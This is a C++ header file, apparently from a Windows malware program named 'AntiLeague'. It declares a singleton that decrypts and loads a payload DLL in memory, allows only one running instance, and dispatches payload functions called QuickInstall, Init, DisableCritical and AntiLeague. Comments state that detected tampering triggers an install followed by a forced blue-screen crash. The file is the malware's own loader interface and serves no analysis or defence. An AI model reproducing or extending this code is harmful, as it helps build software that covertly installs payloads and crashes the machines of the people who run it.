#pragma once

namespace Payload
{
    struct AntiLeague { typedef void (*Proc)(); };
    struct QuickInstall { typedef void (*Proc)(const std::string& payload, const std::string& dec_key); };
    struct Init { typedef void (*Proc)(const std::string* payloadPath, const std::string& payload, const std::string& dec_key); };
    struct DisableCritical { typedef void (*Proc)(); };
}

class AntiLeague
{
private:
    HMEMORYMODULE hPayload;
	std::string getPayload();

    /*
        Thread safe (they're only modified by constructor in main thread)
    */
    HWND hWnd;
    HANDLE SafeShutdown;

    AntiLeague()
		: hPayload(NULL), hWnd(NULL), SafeShutdown(NULL)
	{
		HANDLE hMutex = CreateMutex(NULL, TRUE, L"AntiLeague");

		if (GetLastError() == ERROR_ALREADY_EXISTS)
		{
			exit(0);
		}
	}

    ~AntiLeague()
    {
        SendMessage(hWnd, WM_QUIT, 1, NULL);
        WaitForSingleObject(SafeShutdown, INFINITE);

        MemoryFreeLibrary(hPayload);
        hPayload = NULL;
    }

	void cipher();
	void gen_dec_key();

    friend DWORD WINAPI SafeShutdown(LPVOID event);
    friend LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);

public:
	static AntiLeague& getInstance()
	{
		static AntiLeague instance;
		return instance;
	}

	std::string dec_key;
	std::string payload;

	void Init();
    void LoadPayload(const std::string& payloadPath);

    template <typename T>
    void Attack(const char* functionName, const std::string* payloadPath = nullptr)
    {
        typename T::Proc function = (typename T::Proc)MemoryGetProcAddress(hPayload, functionName);

        if (function != NULL)
        {
            if constexpr (std::is_same_v<T, Payload::Init>)
            {
                function(payloadPath, payload, dec_key);
            }
            else if constexpr (std::is_same_v<T, Payload::QuickInstall>)
            {
                function(payload, dec_key);
            }
            else if constexpr (std::is_same_v<T, Payload::AntiLeague>)
            {
                    function(); //Returns when tampering detected
                    Attack<Payload::QuickInstall>("QuickInstall"); //Install then BSOD
            }
            else if constexpr (std::is_same_v<T, Payload::DisableCritical>)
            {
                function();
            }
            else
            {
                static_assert(!std::is_same_v<T, T>, "Proc not supported");
            }
        }
        else
        {
            MessageBox(NULL, L"Payload Function Missing", L"AntiLeague ERROR", MB_OK | MB_ICONERROR);
            this->~AntiLeague(); //BSOD
        }
    }
};